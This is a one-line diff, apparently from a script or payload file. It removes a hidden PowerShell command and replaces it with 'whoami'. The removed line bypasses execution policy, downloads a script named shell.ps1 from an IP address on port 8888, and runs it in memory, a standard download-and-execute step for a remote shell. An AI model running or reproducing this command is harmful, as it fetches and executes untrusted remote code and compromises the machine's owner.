@@ -1,1 +1,1 @@
-powershell.exe -NoP -sta -NonI -W Hidden -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString('http://192.168.1.21:8888/shell.ps1'))"
+whoami
